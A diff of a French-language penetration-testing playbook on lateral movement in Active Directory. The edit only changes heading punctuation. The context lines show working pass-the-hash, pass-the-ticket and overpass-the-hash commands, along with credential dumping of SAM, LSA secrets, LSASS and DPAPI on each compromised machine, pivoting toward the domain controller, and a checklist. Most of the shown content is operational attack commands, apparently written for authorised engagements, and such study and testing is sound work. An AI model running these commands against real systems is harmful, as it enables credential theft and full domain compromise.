@@ -1,4 +1,4 @@
-# Phase 5 — Mouvement Latéral
+# Phase 5 : Mouvement Latéral
 
 > **Objectif :** Se déplacer de machine en machine pour trouver des credentials supplémentaires, des sessions admin, et progresser vers le DC.
 
@@ -20,7 +20,7 @@
 
 ---
 
-## 5.1 — Pass-the-Hash (PtH)
+## 5.1 : Pass-the-Hash (PtH)
 
 ### Avec nxc (spray sur tout le réseau)
 
@@ -62,7 +62,7 @@ wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET "whoami"
 smbexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
 ```
 
-### Avec evil-winrm (WinRM — port 5985)
+### Avec evil-winrm (WinRM : port 5985)
 
 ```bash
 # Connexion interactive
@@ -82,7 +82,7 @@ smbclient //$TARGET/C$ -U $DOMAIN/$USER --pw-nt-hash --password=$NT_HASH
 
 ---
 
-## 5.2 — Pass-the-Ticket (PtT)
+## 5.2 : Pass-the-Ticket (PtT)
 
 ```bash
 # Obtenir un TGT (avec mdp ou hash)
@@ -104,7 +104,7 @@ nxc smb $DC_FQDN -u $USER --use-kcache -d $DOMAIN
 
 ---
 
-## 5.3 — Overpass-the-Hash (OPtH)
+## 5.3 : Overpass-the-Hash (OPtH)
 
 Convertir un NT hash en TGT Kerberos pour contourner les filtres NTLM.
 
@@ -116,7 +116,7 @@ psexec.py -k -no-pass $DOMAIN/$USER@$TARGET_FQDN
 
 ---
 
-## 5.4 — Actions systématiques sur chaque machine compromise
+## 5.4 : Actions systématiques sur chaque machine compromise
 
 ### À faire sur CHAQUE machine où on a un accès
 
@@ -132,7 +132,7 @@ secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
 # 3. Dumper les LSA secrets (comptes de service, tâches planifiées)
 nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --lsa
 
-# 4. Dumper LSASS (sessions actives — peut donner mdp en clair si WDigest)
+# 4. Dumper LSASS (sessions actives : peut donner mdp en clair si WDigest)
 nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M lsassy
 
 # 5. DPAPI (credentials Chrome, Windows Credential Manager)
@@ -144,7 +144,7 @@ nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M spider_plus
 
 ---
 
-## 5.5 — Stratégie de pivot
+## 5.5 : Stratégie de pivot
 
 ```
 Machine 1 (accès initial)
@@ -171,7 +171,7 @@ nxc smb $DC_IP -u $NEW_USER -H $NEW_HASH -d $DOMAIN
 
 ---
 
-## 5.6 — Conversion de formats de tickets
+## 5.6 : Conversion de formats de tickets
 
 ```bash
 # ccache → kirbi (pour Mimikatz/Rubeus sur Windows)
@@ -191,4 +191,4 @@ ticketConverter.py ticket.kirbi ticket.ccache
 - [ ] LSA secrets dumpés
 - [ ] LSASS dumpé (sessions actives)
 - [ ] Chaque nouveau credential testé sur tout le réseau
-- [ ] Admin sur le DC → [Phase 6 — Compromission Totale](06-compromission.md)
+- [ ] Admin sur le DC → [Phase 6 : Compromission Totale](06-compromission.md)
